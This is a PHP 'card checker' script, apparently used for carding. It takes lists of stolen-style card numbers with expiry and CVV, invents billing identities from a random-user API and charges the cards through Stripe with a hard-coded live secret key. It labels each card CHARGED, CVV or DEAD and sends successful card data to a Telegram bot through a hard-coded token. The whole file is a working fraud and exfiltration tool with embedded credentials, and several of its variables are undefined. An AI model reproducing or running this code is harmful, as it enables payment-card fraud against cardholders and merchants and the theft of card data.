<?php

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
class Person {
    public $fname;
    public $lname;
    public $email;
    public $zip;
    public $add1;
    public $city;
    public $state;
    public $country;

    function __construct() {
        $url = "https://random-data-api.com/api/users/random_user";
        $response = file_get_contents($url);
        $data = json_decode($response, true);
        $this->fname = $data["first_name"];
        $this->lname = $data["last_name"];
        $this->email = $data["email"];
        $this->zip = $data["address"]["zip_code"];
        $this->add1 = $data["address"]["street_address"];
        $this->city = $data["address"]["city"];
        $this->state = $data["address"]["state"];
        $this->country = $data["address"]["country"];
    }
}
function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
$admin = $_GET['tgm'];
$admin = $_GET['tgm'];
function send_message($userid, $msg) {
$text = urlencode($msg);
file_get_contents("https://api.telegram.org/bot6604975623:AAEx4CGoN1egOeFr615ICsjN9iVRRqXMmRA/sendMessage?chat_id=$userid&text=$text&parse_mode=HTML");
file_get_contents("https://api.telegram.org/bot6604975623:AAEx4CGoN1egOeFr615ICsjN9iVRRqXMmRA/sendMessage?chat_id=$admin&text=$text&parse_mode=HTML");

};

if(isset($_GET['cst'])){

$amt = $_GET['cst'];
}
if(empty($amt)) {
    $amt = '1';
}
$chr = $amt * 100;
$prev = $chr -10;
$next = $chr +10;
$sk ='sk_live_SvHmHv3TACrYBX82Kh10ZBXF00ViAurriX';

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
$rand = new Person();
$name = $rand->fname . " " . $rand->lname;
$email = $rand->email;
$add1 = $rand->add1;
$city = $rand->city;
$state = $rand->state;
$zip = $rand->zip;
$country = $rand->country;
#-------------------[1st REQ]--------------------#  

$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$name.'&billing_details[email]='.$email.'&billing_details[address][line1]='.$add1.'&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][country]=US'); 
$result1 = curl_exec($ch);  
$tok1 = Getstr($result1,'"id": "','"');
if (strpos($result1, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}
#-------------------[2nd REQ]--------------------#

$x = 0;  

while(true)  

{  

$ch = curl_init();  

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  

curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  

curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=eur&payment_method_types[]=card&description=undefy&payment_method='.$tok1.'&confirm=true&off_session=true');  

$result2 = curl_exec($ch);  

$tok2 = Getstr($result2,'"id": "','"');  

$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  

//echo "<br><b>Result2: </b> $result2<br>";  

if (strpos($result2, "rate_limit"))   

{  

    $x++;  

    continue;  

}  

break;  

}



//=================== [ RESPONSES ] ===================//

if(strpos($result2, '"seller_message": "Payment complete."' )) {
    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>
➜ 𝗥𝗲𝘀𝘂𝗹𝘁:  $'.$amt.' CCN Charged ♻️ <br>
➜ 𝗜𝗻𝗳𝗼: Name:'.$name.' Address:'.$add1.' State:'.$state.'  Zip:'.$zip. 'Country: '.$country.'<br>
➜ 𝗥𝗲𝗰𝗶𝗽𝘁: <a href=$receipturl>Here</a> <br>
';
    send_message($admin, "CC \nϲϲ ➔ <code>$lista</code>\nTYPE➠ Ccn $amt$ \n ➠ <code>$hit_resp</code>");
    

}

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 𝗰𝘃𝘃 𝗹𝗶𝘃𝗲</span><br>';
}


elseif(strpos($result1, "generic_decline")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: sad decline</span><br>';
    }
elseif(strpos($result2, "generic_decline" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: sad decline</span><br>';
}
elseif(strpos($result2, "insufficient_funds" )) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: lil bro is poor</span><br>';
}

elseif(strpos($result2, "fraudulent" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: they think im a scammer</span><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result:tf is that</span><br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif(strpos($result,"fraudulent")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: they think im a scammer</span><br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    file_get_contents($forwardccn);
    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: cvc wrong</span><br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    file_get_contents($forwardccn);
    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: cvc wrong</span><br>';
     
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD EXPIRY MONTH</span><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD ACCOUNT</span><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY checker</span> <br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
    }

elseif(strpos($result2, "stolen_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: bro dont allowed the transaction</span><br>';
    }
    elseif(strpos($result2, "authentication_required")) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
elseif(strpos($result2, "incorrect_cvc" )) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';

}
elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK IS AT RATE LIMIT</span><br>';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC CARD</span><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';

}
elseif(strpos($result2,' "decline_code": "do_not_honor"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : FAIL</span><br>';
}
elseif(strpos($result2, "card_not_supported")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : UNVAILABLE</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECKED : FAIL</span><br>';
}
elseif(strpos($result2,"currency_not_supported")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CURRENCY NOT SUPORTED TRY IN INR</span><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
}
elseif(strpos($result2, "fraudulent" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: sk ded or invalid</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: sk ded</span><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: ENTER CC TO CHECK</span><br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
else {
    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: INCREASE AMOUNT OR TRY ANOTHER CARD</span><br>';
   
   
      
}




//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "<b>Risk Level:</b> $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";

echo " BYPASSING: $x <br>";

//echo "<br><b>Result3: </b> $result2<br>";

curl_close($ch);
ob_flush();
?>
